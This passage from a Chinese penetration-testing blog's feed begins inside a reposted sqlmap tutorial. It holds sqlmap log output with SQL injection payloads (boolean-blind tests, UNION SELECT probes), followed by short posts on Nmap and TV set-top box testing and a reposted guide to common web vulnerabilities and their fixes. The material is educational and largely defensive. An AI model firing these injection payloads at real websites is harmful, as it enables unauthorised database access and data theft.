1)/**/Union/**/aLl/**/seLeCt/**/nuLL,nuLL,nuLL--/**/ylpg</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></p><p>而若不加tamper脚本，上例的部分输出为：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">  [13:00:12] [INFO] testing <span class="hljs-keyword">for</span> SQL injection on GET parameter <span class="hljs-string">'id'</span></span><br><span class="line">  [13:00:12] [INFO] testing <span class="hljs-string">'AND boolean-based blind - WHERE or HAVING clause'</span></span><br><span class="line">  [13:00:12] [PAYLOAD] 1) AND 9902=5632 AND (5820=5820</span><br><span class="line">  [13:00:12] [PAYLOAD] 1) AND 6711=6711 AND (7174=7174</span><br><span class="line">  [13:00:12] [PAYLOAD] 1 AND 7140=6136</span><br><span class="line">  [13:00:12] [PAYLOAD] 1 AND 6711=6711</span><br><span class="line">  [13:00:12] [PAYLOAD] 1 AND 1693=7532-- oqcR</span><br><span class="line">  [13:00:12] [PAYLOAD] 1 AND 6711=6711-- qAPJ</span><br><span class="line">  [13:00:12] [PAYLOAD] 1<span class="hljs-string">') AND 6904=7395 AND ('</span>xBlu<span class="hljs-string">'='</span>xBlu</span><br><span class="line">  [13:00:12] [PAYLOAD] 1<span class="hljs-string">') AND 6711=6711 AND ('</span>RgoX<span class="hljs-string">'='</span>RgoX</span><br><span class="line">  [13:00:12] [PAYLOAD] 1<span class="hljs-string">' AND 6469=7302 AND '</span>maCj<span class="hljs-string">'='</span>maCj</span><br><span class="line">  [13:00:12] [PAYLOAD] 1<span class="hljs-string">' AND 6711=6711 AND '</span>pSYg<span class="hljs-string">'='</span>pSYg</span><br><span class="line">  [13:00:12] [PAYLOAD] 1%<span class="hljs-string">' AND 7516=3605 AND '</span>%<span class="hljs-string">'='</span></span><br><span class="line">  [13:00:12] [PAYLOAD] 1%<span class="hljs-string">' AND 6711=6711 AND '</span>%<span class="hljs-string">'='</span></span><br><span class="line">  [...]</span><br><span class="line">  [13:00:12] [PAYLOAD] 1) UNION ALL SELECT NULL-- mUDh</span><br><span class="line">  [13:00:12] [PAYLOAD] 1) UNION ALL SELECT NULL,NULL-- QKId</span><br><span class="line">  [13:00:12] [PAYLOAD] 1) UNION ALL SELECT NULL,NULL,NULL-- iwvT</span><br><span class="line">  [...]</span><br></pre></td></tr></table></figure></p><h3 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h3><p>后面命令行还有很多，多了我是有点看不下去的，所以分成三部分吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;人对于周围的失去看得是多么不清楚，常常必得从远方来一个人告诉我们周围的真面目。所以人必须把万物从自己身边推开，以便后来善于取用较为正确而平静的方式，以稀少的亲切和敬畏的距离来同他们接近。  ——里克尔《给青年诗人的信》 &lt;/font&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;本文转载自werner-wiki的博客，便于参考学习（侵权删）原文地址：&lt;a href=&quot;https://blog.csdn.net/wn314/article/details/78872828。&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/wn314/article/details/78872828。&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x01-Sqlmap是什么&quot;&gt;&lt;a href=&quot;#0x01-Sqlmap是什么&quot; class=&quot;headerlink&quot; title=&quot;0x01 Sqlmap是什么&quot;&gt;&lt;/a&gt;0x01 Sqlmap是什么&lt;/h3&gt;&lt;p&gt;Sqlmap是开源的自动化SQL注入工具，由Python写成，具有如下特点：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统。
完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。
在数据库证书、IP地址、端口和数据库名等条件允许的情况下支持不通过SQL注入点而直接连接数据库。
支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。
支持自动识别密码哈希格式并通过字典破解密码哈希。
支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。
支持在数据库管理系统中搜索指定的数据库名、表名或列名
当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持下载或上传文件。
当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持执行任意命令并回现标准输出。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.f4guo.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="工具手册" scheme="http://www.f4guo.top/tags/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"/>
    
  </entry>
  
  <entry>
    <title>Nmap命令行参考</title>
    <link href="http://www.f4guo.top/2019/03/20/Nmap%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E8%80%83/"/>
    <id>http://www.f4guo.top/2019/03/20/Nmap命令行参考/</id>
    <published>2019-03-20T08:12:13.000Z</published>
    <updated>2019-03-22T15:07:12.209Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">人的一生中总会有这么一次特殊的旅行，，我更愿意把它叫作“命运之旅”。长久以来，我一直坚持认为，旅行与读书不同，如果是一本书，你可以反复阅读，而随着年龄的增长，也可以多次体会那种邂逅的感觉，但影响人生的旅行，一生只有一次。  ——角田光代《星期三的神明》     </font></blockquote><p>Nmap命令行目前还有点记不住，又懒得打字，偷个懒~~以后看图说话。<br><a id="more"></a><br><img src="/images/paperimage/nmap.png" alt=""><br>【侵删】</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;人的一生中总会有这么一次特殊的旅行，，我更愿意把它叫作“命运之旅”。长久以来，我一直坚持认为，旅行与读书不同，如果是一本书，你可以反复阅读，而随着年龄的增长，也可以多次体会那种邂逅的感觉，但影响人生的旅行，一生只有一次。  ——角田光代《星期三的神明》     &lt;/font&gt;
&lt;/blockquote&gt;
&lt;p&gt;Nmap命令行目前还有点记不住，又懒得打字，偷个懒~~以后看图说话。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.f4guo.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="工具手册" scheme="http://www.f4guo.top/tags/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"/>
    
  </entry>
  
  <entry>
    <title>电视机顶盒安全测试</title>
    <link href="http://www.f4guo.top/2019/03/19/%E7%94%B5%E8%A7%86%E6%9C%BA%E9%A1%B6%E7%9B%92%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    <id>http://www.f4guo.top/2019/03/19/电视机顶盒安全测试/</id>
    <published>2019-03-19T02:56:27.000Z</published>
    <updated>2019-03-26T09:11:47.102Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">我有时候觉得，这种“远方”的看不见的在灵魂聊涌动的事物，比近旁直观的事物更为深邃，也更难抵达。生活中，这种奇怪的莫名的“远方”总是牵动着我。但其实我知道，“远方”哪儿也不是，它不过是一个假想物，一个大幻想——或者是我们内心中冥冥守候的一个人。   ——陈染《与另一个自己相遇》 </font></blockquote><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>偶然的机会接触到了对电视机顶盒进行安全测试，这对于我来说完全是新的领域，果然不出所料最后也没有什么成果，但还是想总结一下，有新的发现就来更新。<br><a id="more"></a></p><h3 id="0x00-机顶盒"><a href="#0x00-机顶盒" class="headerlink" title="0x00 机顶盒"></a>0x00 机顶盒</h3><p>什么是机顶盒？</p><pre><code>网络电视机顶盒，是2012年开始兴起的一种电视互联网终端设备，也被称作互联网播放机、互联网高清播放机、电视伴侣、电视盒子、网络机顶盒等，亦常被简称作“盒子”。该设备的操作系统通常基于tvOS或Android或Linux，借由通过Wifi无线网络或以太网等实体线路与互联网进行连接。在连接互联网之后，可以实现在传统的电视上在线点播、在线电视直播、浏览网页、收看海外电视与电影、甚至是玩游戏。--维基百科数字视频变换盒（Set Top Box）简称STB，通常称作机顶盒或机上盒，是一个连接电视机与外部信号源的设备。它可以将压缩的数字信号转成电视内容，并在电视机上显示出来。信号可以来自有线电缆、卫星天线、宽带网络以及地面广播。机顶盒接收的内容除了模拟电视可以提供的图像、声音之外，更在于能够接收数字内容，包括电子节目指南、因特网网页、字幕等等。 --百度百科</code></pre><h3 id="0x01-机顶盒安全测试"><a href="#0x01-机顶盒安全测试" class="headerlink" title="0x01 机顶盒安全测试"></a>0x01 机顶盒安全测试</h3><p>根据我的个人经验来理解，可以把机顶盒的安全测试分为以下几个模块：</p><h4 id="硬件安全"><a href="#硬件安全" class="headerlink" title="硬件安全"></a>硬件安全</h4><p>拆开机顶盒里面其实是一块开发板。</p><h4 id="Andorid-安全"><a href="#Andorid-安全" class="headerlink" title="Andorid 安全"></a>Andorid 安全</h4><p>机顶盒连上显示器，用遥控器进行操控，可以安装卸载应用，可以理解为Android系统，但事实是大部分机顶盒确实是一个Android系统。<br><img src="/images/paperimage/jidinghe3.jpg" alt="家用机顶盒显示器页面"></p><h4 id="APP-安全"><a href="#APP-安全" class="headerlink" title="APP 安全"></a>APP 安全</h4><p>系统里面的应用除了可以自己在商店安装以外，预装应用都是以APK形式安装上去的。<br><img src="/images/paperimage/jidinghe.png" alt="应用文件"></p><h4 id="Web安全-集成第三方服务"><a href="#Web安全-集成第三方服务" class="headerlink" title="Web安全(集成第三方服务)"></a>Web安全(集成第三方服务)</h4><p>最后就是第三方集成到机顶盒里面了，机顶盒直接通过url或IP地址访问第三方服务器获取对应的服务。这类进行安全测试和日常的Web安全测试差不多太多。</p><h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>有的机顶盒除了WLAN口，还有很多LAN口，具有路由或无线功能，这类机顶盒可以通过网络连接进行抓包改包什么的，测试起来比较方便。但有的机顶盒就只有一个WLAN口，没有LAN口，这类机顶盒就是我目前比较头疼的，遇到这种只能进行Andorid系统和APP安全的测试，如果大佬有高招请指点一下，谢谢，最后放个简单的结构图。<br><img src="/images/paperimage/jidinghe4.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;我有时候觉得，这种“远方”的看不见的在灵魂聊涌动的事物，比近旁直观的事物更为深邃，也更难抵达。生活中，这种奇怪的莫名的“远方”总是牵动着我。但其实我知道，“远方”哪儿也不是，它不过是一个假想物，一个大幻想——或者是我们内心中冥冥守候的一个人。   ——陈染《与另一个自己相遇》 &lt;/font&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;偶然的机会接触到了对电视机顶盒进行安全测试，这对于我来说完全是新的领域，果然不出所料最后也没有什么成果，但还是想总结一下，有新的发现就来更新。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.f4guo.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>WEB常见漏洞问题危害及修复建议(转载)</title>
    <link href="http://www.f4guo.top/2019/03/13/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E9%97%AE%E9%A2%98%E5%8D%B1%E5%AE%B3%E5%8F%8A%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/"/>
    <id>http://www.f4guo.top/2019/03/13/WEB常见漏洞问题危害及修复建议/</id>
    <published>2019-03-13T03:31:09.000Z</published>
    <updated>2019-03-15T05:08:42.702Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">我着迷于机场，因为那里的一切都劝诱着我们出走、离开。我幻想着在航站楼里度过余生。我的旅行总是以逃离开始，以对时间的追逐而结束。                     ——西尔万·泰松《在西伯利亚森林中》</font></blockquote><h3 id="0x00-高危漏洞"><a href="#0x00-高危漏洞" class="headerlink" title="0x00 高危漏洞"></a>0x00 高危漏洞</h3><p>高危漏洞包括SQL注入漏洞、XSS跨站脚本漏洞、页面存在源代码泄露、网站存在备份文件、网站存在包含SVN信息的文件、网站存在Resin任意文件读取漏洞。</p><p>SQL注入漏洞：网站程序忽略了对输入字符串中包含的SQL语句的检查，使得包含的SQL语句被数据库误认为是合法的SQL指令而运行，导致数据库中各种敏感数据被盗取、更改或删除。<br><a id="more"></a><br>XSS跨站脚本漏洞：网站程序忽略了对输入字符串中特殊字符与字符串（如<code>&lt;&gt;&#39;&quot;&lt;script&gt;&lt;iframe&gt;onload</code>）的检查，使得攻击者可以欺骗用户访问包含恶意JavaScript代码的页面，使得恶意代码在用户浏览器中执行，从而导致目标用户权限被盗取或数据被篡改。</p><p>页面存在源代码泄露：页面存在源代码泄露,可能导致网站服务的关键逻辑、配置的账号密码泄露，攻击者利用该信息可以更容易得到网站权限，导致网站被黑。</p><p>网站存在备份文件：网站存在备份文件，例如数据库备份文件、网站源码备份文件等，攻击者利用该信息可以更容易得到网站权限，导致网站被黑。</p><p>网站存在包含SVN信息的文件：网站存在包含SVN信息的文件，这是网站源码的版本控制器私有文件，里面包含SVN服务的地址、提交的私有文件名、SVN用户名等信息，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。</p><p>网站存在Resin任意文件读取漏洞：安装某些版本Resin服务器的网站存在可读取任意文件的漏洞，攻击者利用该漏洞可以读取网站服务器的任意文件内容，导致网站被黑。</p><h3 id="0x01-中危漏洞"><a href="#0x01-中危漏洞" class="headerlink" title="0x01 中危漏洞"></a>0x01 中危漏洞</h3><p>中危漏洞包括网站存在目录浏览漏洞、网站存在PHPINFO文件、网站存在服务器环境探针文件、网站存在日志信息文件、网站存在JSP示例文件。</p><p>网站存在目录浏览漏洞：网站存在配置缺陷，存在目录可浏览漏洞，这会导致网站很多隐私文件与目录泄露，比如数据库备份文件、配置文件等，攻击者利用该信息可以更容易得到网站权限，导致网站被黑。</p><p>网站存在PHPINFO文件：网站存在PHPINFO文件，这个是PHP特有的信息文件，会导致网站的大量架构信息泄露，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。</p><p>网站存在服务器环境探针文件：网站存在服务器环境探针文件，该文件会导致网站的大量架构信息泄露，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。</p><p>网站存在日志信息文件：网站存在日志信息文件，该文件包含的错误信息会导致网站的一些架构信息泄露，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。</p><p>网站存在JSP示例文件：网站存在JSP示例文件，该文件的弱口令会导致网站的大量架构信息泄露，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。</p><h3 id="0x02-低危漏洞"><a href="#0x02-低危漏洞" class="headerlink" title="0x02 低危漏洞"></a>0x02 低危漏洞</h3><p>低危漏洞包括页面上存在网站程序的调试信息、网站存在后台登录地址、网站存在服务端统计信息文件、网站存在敏感目录。</p><p>页面上存在网站程序的调试信息：页面上存在数据库信息，例如数据库名、数据库管理员名，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。</p><p>网站存在后台登录地址：网站存在后台登录地址，攻击者经常使用这个地址进行网站的后台登陆，比如弱密码、表单绕过、暴力破解等，从而得到网站的权限。</p><p>网站存在服务端统计信息文件：网站存在服务端统计信息文件，该文件会导致网站的一些架构信息泄露，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。</p><p>网站存在敏感目录：网站存在敏感目录，例如 /upload /database /bak，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。</p><h3 id="0x03-漏洞的危害"><a href="#0x03-漏洞的危害" class="headerlink" title="0x03 漏洞的危害"></a>0x03 漏洞的危害</h3><p>SQL注入漏洞的危害不仅体现在数据库层面，还有可能危及承载数据库的操作系统；如果SQL注入被用来挂马，还可能用来传播恶意软件等，这些危害包括但不限于：</p><pre><code>• 数据库信息泄漏：数据库中存储的用户隐私信息泄露。• 网页篡改：通过操作数据库对特定网页进行篡改。• 网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。• 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。• 服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。• 破坏硬盘数据，瘫痪全系统。</code></pre><p>XSS跨站脚本漏洞的危害包括但不限于：</p><pre><code>• 钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者注入钓鱼JavaScript以监控目标网站的表单输入，甚至发起基于DHTML更高级的钓鱼攻击方式。• 网站挂马：跨站后利用IFrame嵌入隐藏的恶意网站或者将被攻击者定向到恶意网站上，或者弹出恶意网站窗口等方式都可以进行挂马攻击。• 身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS可以盗取用户的Cookie，从而利用该Cookie获取用户对该网站的操作权限。如果一个网站管理员用户Cookie被窃取，将会对网站引发巨大的危害。• 盗取网站用户信息：当能够窃取到用户Cookie从而获取到用户身份时，攻击者可以获取到用户对网站的操作权限，从而查看用户隐私信息。• 垃圾信息发送：比如在SNS社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群体。• 劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，监视用户的浏览历史，发送与接收的数据等等。• XSS蠕虫：XSS 蠕虫可以用来打广告、刷流量、挂马、恶作剧、破坏网上数据、实施DDoS攻击等。</code></pre><p>信息泄露漏洞的危害</p><p>CGI漏洞大多分为以下几种类型：信息泄露、命令执行和溢出，因此危害的严重程度不一。信息泄露会暴露服务器的敏感信息，使攻击者能够通过泄露的信息进行进一步入侵；命令执行会对服务器的安全造成直接的影响，如执行任意系统命令；溢出往往能够让攻击者直接控制目标服务器，危害重大。</p><p>内容泄露漏洞：会被攻击者利用导致其它类型的攻击，危害包括但不局限于：</p><pre><code>• 内网ip泄露：可能会使攻击者渗透进入内网产生更大危害。• 数据库信息泄露：让攻击者知道数据库类型，会降低攻击难度。• 网站调试信息泄露：可能让攻击者知道网站使用的编程语言，使用的框架等，降低攻击难度。• 网站目录结构泄露：攻击者容易发现敏感文件。• 绝对路径泄露：某些攻击手段依赖网站的绝对路径，比如用SQL注入写webshell。• 电子邮件泄露：邮件泄露可能会被垃圾邮件骚扰，还可能被攻击者利用社会工程学手段获取更多信息，扩大危害。文件泄露漏洞：可能会导致重要信息的泄露，进而扩大安全威胁，这些危害包括但不局限于：• 帐号密码泄漏：可能导致攻击者直接操作网站后台或数据库，进行一些可能有危害的操作。• 源码泄露：可能会让攻击者从源码中分析出更多其它的漏洞，如SQL注入，文件上传，代码执行等。• 系统用户泄露：可能会方便暴力破解系统密码。</code></pre><h4 id="0x04漏洞解决方案"><a href="#0x04漏洞解决方案" class="headerlink" title="0x04漏洞解决方案"></a>0x04漏洞解决方案</h4><p>SQL注入漏洞解决方案：</p><pre><code>1.解决SQL注入漏洞的关键是对所有来自用户输入的数据进行严格检查、对数据库配置使用最小权限原则2.所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。3.对进入数据库的特殊字符（&apos;&quot;\&lt;&gt;&amp;*;等）进行转义处理，或编码转换。4.确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。5.数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。6.网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。7.严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。8.避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。9.在网站发布之前建议使用一些专业的SQL注入检测工具进行检测，及时修补这些SQL注入漏洞。</code></pre><p>XSS跨站脚本漏洞解决方案：</p><pre><code>1.假定所有输入都是可疑的，必须对所有输入中的script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。2.不要仅仅验证数据的类型，还要验证其格式、长度、范围和内容。3．不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。4．对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。5．在网站发布之前建议测试所有已知的威胁。</code></pre><p>页面存在源代码泄露解决方案：</p><pre><code>1.配置好服务端语言解析，防止解析失败而导致源码泄露；2.关闭网站错误调试机制，防止因为报错而导致源码泄露。</code></pre><p>网站存在备份文件解决方案：删除检测出的备份文件，或者将这类文件从网站目录下移走。</p><p>网站存在包含SVN信息的文件解决方案：删除网站目录下的SVN信息，不要使用SVN目录作为网站的目录。</p><p>网站存在Resin任意文件读取漏洞解决方案：删除resin_doc相关目录与文件。</p><p>网站存在目录浏览漏洞：关闭Web容器（如IIS/Apache等）的目录浏览功能，比如：</p><pre><code>1.IIS中关闭目录浏览功能：在IIS的网站属性中，勾去“目录浏览”选项，重启IIS；2.Apache中关闭目录浏览功能：打开Apache配置文件httpd.conf，查找 “Options Indexes FollowSymLinks”，修改为“ Options -Indexes”(减号表示取消)，保存退出，重启Apache。</code></pre><p>网站存在PHPINFO文件解决方案：删除检测出的PHPINFO文件。</p><p>网站存在服务器环境探针文件解决方案：删除检测出的探针文件，比如：iprober.php、phpcheck.php、jspcheck.jsp、DotNetInfo.aspx、aspcheck.asp等。</p><p>网站存在日志信息文件解决方案：删除检测出的日志信息文件。</p><p>网站存在JSP示例文件解决方案：删除JSP示例文件。</p><p>页面上存在数据库信息解决方案：关闭数据库的错误调试机制，防止因为SQL语句错误导致数据库报错信息显示到页面上。</p><p>页面上存在网站程序的调试信息解决方案：关闭网站程序的调试机制，这个机制经常被用于网站的测试调试，该机制能显示出很详细的网站报错信息。</p><p>网站存在后台登录地址解决方案：</p><pre><code>1.将后台登录地址隐藏，改个不容易猜到的路径；2.配置好后台登录地址的访问权限，比如只允许某个IP或IP段的用户访问。</code></pre><p>网站存在服务端统计信息文件解决方案：删除检测出的服务端统计信息文件。</p><p>网站存在敏感目录解决方案：这些目录经常用于存放敏感的文件，可以考虑从网站目录中分离出，或改个不易猜测到的路径，并配置好访问权限。</p><hr><p>原文链接：<a href="https://www.jb51.net/hack/500534.html" target="_blank" rel="noopener">WEB常见漏洞问题及危害和修复建议</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;我着迷于机场，因为那里的一切都劝诱着我们出走、离开。我幻想着在航站楼里度过余生。我的旅行总是以逃离开始，以对时间的追逐而结束。                     ——西尔万·泰松《在西伯利亚森林中》&lt;/font&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-高危漏洞&quot;&gt;&lt;a href=&quot;#0x00-高危漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x00 高危漏洞&quot;&gt;&lt;/a&gt;0x00 高危漏洞&lt;/h3&gt;&lt;p&gt;高危漏洞包括SQL注入漏洞、XSS跨站脚本漏洞、页面存在源代码泄露、网站存在备份文件、网站存在包含SVN信息的文件、网站存在Resin任意文件读取漏洞。&lt;/p&gt;
&lt;p&gt;SQL注入漏洞：网站程序忽略了对输入字符串中包含的SQL语句的检查，使得包含的SQL语句被数据库误认为是合法的SQL指令而运行，导致数据库中各种敏感数据被盗取、更改或删除。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.f4guo.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全" scheme="http://www.f4guo.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
